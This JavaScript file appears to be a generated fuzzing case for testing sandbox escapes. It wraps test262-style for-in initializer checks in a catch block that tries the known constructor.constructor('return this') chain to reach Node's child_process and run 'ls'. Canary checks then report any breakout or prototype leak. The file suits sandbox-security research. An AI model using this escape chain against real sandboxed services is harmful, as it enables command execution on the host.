try {
    (function () {
        let REPLACER = 23;
        var effects = 0;
        for (var a = ++effects in {});
        assert.sameValue(effects, 1);
    }());
    (function () {
        let REPLACER = 23;
        var stored;
        for (var a = 0 in (stored = a, {}));
        assert.sameValue(stored, 0);
    }());
    (function () {
        let REPLACER = 23;
        for (var a = 0 in {});
        assert.sameValue(a, 0);
    }());
    (function () {
        throw () => {
            return () => {
            };
        };
        var effects = 0;
        var iterations = 0;
        var stored;
        for (var a = (++effects, -1) in (stored = a, {
                a: 0,
                b: 1,
                c: 2
            })) {
            ++iterations;
        }
        assert.sameValue(stored, -1, 'Initialized value should be available to RHS');
        assert.sameValue(effects, 1, 'Initializer should only be executed once');
        assert.sameValue(iterations, 3, 'Loop body should be executed the appropriate number of times');
    }());
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}